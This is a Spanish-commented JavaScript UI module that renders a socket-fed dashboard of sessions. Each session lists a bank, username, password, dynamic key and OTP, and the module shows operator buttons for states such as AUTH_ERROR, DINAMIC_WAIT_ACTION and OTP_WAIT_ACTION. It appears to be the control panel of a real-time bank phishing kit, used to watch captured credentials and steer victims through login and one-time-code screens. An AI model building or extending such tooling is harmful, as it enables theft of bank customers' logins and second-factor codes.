import { CFG } from "../core/config.js";
import { ACTIONS_BY_STEP } from "./actions.js";

const $ = (sel, root = document) => root.querySelector(sel);
const tpl = (id) => {
    const t = document.getElementById(id);
    if (!t) throw new Error(`Template no encontrado: ${id}`);
    return t;
};
export const isSmallScreen = () =>
    window.matchMedia(CFG.smallScreenMedia).matches;

export const stateDotClass = (state) => {
    switch (String(state || "").toUpperCase()) {
        case "ACTIVE":
            return "green";
        case "INACTIVE":
            return "red";
        case "MINIMIZED":
            return "yellow";
        default:
            return "gray";
    }
};

export function setConnPill(connected) {
    const pill = $("#connPill");
    if (!pill) return;
    pill.replaceChildren();
    pill.append("Socket:");

    const dot = document.createElement("span");
    dot.className = `dot ${stateDotClass(connected ? "ACTIVE" : "INACTIVE")}`;
    pill.appendChild(dot);
}

export function getFilteredSortedSessions(state) {
    const q = (state.query || "").trim().toLowerCase();
    return Object.values(state.sessionsById)
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))
        .filter((s) => {
            if (!q) return true;
            const blob = [
                s.id,
                s.state,
                s.action,
                s.user,
                s.pass,
                s.dinamic,
                s.otp,
            ]
                .map((v) => String(v ?? "").toLowerCase())
                .join(" ");
            return blob.includes(q);
        });
}

function hasValue(v) {
    return v !== null && v !== undefined && String(v).trim() !== "";
}

function setFieldPill(root, key, value) {
    const pill = root.querySelector(`[data-field-pill="${key}"]`);
    if (!pill) return;
    pill.classList.remove("missing", "ok");
    pill.classList.add(hasValue(value) ? "ok" : "missing");
}

// tu mapa de action -> label + css
const ACTION_UI = {
    AUTH_ERROR: { label: "LOGO", css: "background:#fc5555;color:#fff;" },
    AUTH_WAIT_ACTION: { label: "LOGO", css: "background:#fdb813;color:#fff;" },

    DINAMIC_ERROR: { label: "DINA", css: "background:#fc5555;color:#fff;" },
    DINAMIC_WAIT_ACTION: {
        label: "DINA",
        css: "background:#fdb813;color:#fff;",
    },

    OTP_ERROR: { label: "OTP", css: "background:#fc5555;color:#fff;" },
    OTP_WAIT_ACTION: { label: "OTP", css: "background:#fdb813;color:#fff;" },

    FINISHED: { label: "OK", css: "background:#1db954;color:#fff;" },
};

function prettyBank(bank) {
    if (!bank) return "—";
    return String(bank).replaceAll("_", " ").toUpperCase();
}

function applyActionUI(el, action) {
    el.textContent = action ?? "—";
    el.style.cssText = "";

    const ui = ACTION_UI[action];
    if (ui) {
        el.textContent = ui.label;
        el.style.cssText = ui.css;
    }
}

export function renderList(state) {
    const list = $("#sessionsList");
    if (!list) return;
    list.replaceChildren();

    const items = getFilteredSortedSessions(state);
    if (!items.length) {
        const empty = document.createElement("div");
        empty.style.opacity = ".7";
        empty.style.padding = "10px";
        empty.textContent = "Sin resultados";
        list.appendChild(empty);
        return;
    }

    const rowTpl = tpl("tpl-session-row");
    for (const s of items) {
        const node = rowTpl.content.firstElementChild.cloneNode(true);
        node.dataset.sessionId = s.id;

        // dot + sid
        node.querySelector('[data-part="stateDot"]').classList.add(
            stateDotClass(s.state)
        );
        node.querySelector('[data-part="sid"]').textContent = s.id;

        // bank (en tu ejemplo es null => —)
        node.querySelector('[data-field="bank"]').textContent = prettyBank(
            s.bank
        );

        // right meta
        setFieldPill(node, 'user', s.user);
        node.querySelector('[data-field="user"]').textContent = s.user ?? "-";
        node.querySelector('[data-field="pass"]').textContent = s.pass ?? "-";
        node.querySelector('[data-field="dinamic"]').textContent =
            s.dinamic ?? "-";
        node.querySelector('[data-field="otp"]').textContent = s.otp ?? "-";

        // action pill (AUTH_ERROR => LOGO rojo)
        applyActionUI(node.querySelector('[data-field="action"]'), s.action);

        list.appendChild(node);
    }
}

export function renderActionsForSession(session, container) {
    container.replaceChildren();
    if (!session) return;

    const defs = ACTIONS_BY_STEP[session.action] ?? [
        { info: true, label: "Sin acciones disponibles en este estado." },
    ];
    const btnTpl = tpl("tpl-action-btn");
    const infoTpl = tpl("tpl-action-info");

    for (const a of defs) {
        if (a.info) {
            const info = infoTpl.content.firstElementChild.cloneNode(true);
            info.textContent = a.label;
            container.appendChild(info);
            continue;
        }
        const btn = btnTpl.content.firstElementChild.cloneNode(true);
        btn.textContent = a.label;
        if (a.kind) btn.className = a.kind;

        btn.dataset.action = a.action;
        btn.dataset.sessionId = session.id;
        btn.dataset.needsMessage = a.needsMessage ? "1" : "0";
        container.appendChild(btn);
    }
}

export function renderDetail(state) {
    const s = state.selectedId ? state.sessionsById[state.selectedId] : null;

    const selectedIdEl = $("#selectedId");
    const detailBox = $("#detailBox");
    const detailTop = $("#detailTop");
    const actions = $("#actions");

    if (selectedIdEl) selectedIdEl.textContent = s?.id ?? "—";
    if (detailBox) detailBox.textContent = JSON.stringify(s ?? {}, null, 2);
    if (!detailTop || !actions) return;

    detailTop.replaceChildren();

    if (!s) {
        detailTop.textContent = "Selecciona una sesión.";
        actions.replaceChildren();
        return;
    }

    const topTpl = tpl("tpl-detail-top");
    const top = topTpl.content.cloneNode(true);

    const dot = top.querySelector(".dot");
    dot.classList.add(stateDotClass(s.state));
    top.querySelector(".detailState").textContent = s.state ?? "—";
    top.querySelector(".detailAction").textContent = s.action ?? "—";

    detailTop.appendChild(top);
    renderActionsForSession(s, actions);

    // Modal mobile
    if (isSmallScreen()) {
        $("#modalSessionId").textContent = s.id ?? "—";
        $("#modalState").textContent = s.state ?? "—";
        $("#modalActionPill").textContent = `${s.action ?? "—"}`;
        $("#modalDetailBox").textContent = JSON.stringify(s ?? {}, null, 2);

        const modalDotWrap = $("#modalDot");
        modalDotWrap.replaceChildren();
        const mdot = document.createElement("span");
        mdot.className = `dot ${stateDotClass(s.state)}`;
        modalDotWrap.appendChild(mdot);

        renderActionsForSession(s, $("#modalActions"));
    }
}
